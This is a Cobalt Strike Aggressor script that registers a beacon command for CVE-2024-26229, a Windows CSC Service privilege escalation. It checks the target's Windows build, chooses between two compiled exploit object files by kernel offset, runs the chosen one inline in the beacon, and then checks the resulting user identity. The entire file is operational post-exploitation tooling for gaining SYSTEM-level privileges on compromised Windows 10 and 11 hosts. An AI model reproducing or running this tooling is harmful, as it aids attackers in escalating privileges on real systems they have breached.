alias CVE-2024-26229 {
    local('$handle $data $0x360 $0x4b8 $winbuild');
    btask($1, "Tasked beacon to inline-execute: CVE-2024-26229");
    $0x360 =  script_resource("bin/escalation/OtherExps/CVE-2024-26229-0x360.o");
    $0x4b8 =  script_resource("bin/escalation/OtherExps/CVE-2024-26229-0x4b8.o");

	$winbuild = binfo($1, "build");
    blog($1, "Current Windows OS Build: $winbuild");
    blog($1, "Vulnerable system version Win10/11 1909/20H2/21H2/22H2/23H2");

    if ($winbuild != '9200' && $winbuild != '9600' && $winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363' && $winbuild != '19041' && $winbuild != '19042' && $winbuild != '19043' && $winbuild != '19044' && $winbuild != '19045' && $winbuild != '22000' && $winbuild != '22621' && $winbuild != '22631') {
        berror($bid, "This exploit only supports Windows 10 And Windows 11 Series System");
        return;
    }

    if ($winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363') {
        blog($1,$0x4b8);
	    $handle = openf($0x4b8);
	    $data   = readb($handle, -1);
	    closef($handle);
	    beacon_inline_execute($1, $data, "go");
        bgetuid($1);
    } else {
        blog($1,$0x360);
	    $handle = openf($0x360);
	    $data   = readb($handle, -1);
	    closef($handle);
	    beacon_inline_execute($1, $data, "go");
        bgetuid($1);
    }
}

beacon_command_register(
    "CVE-2024-26229", 
    "Windows CSC Service Privilege Escalation Vulnerability"
);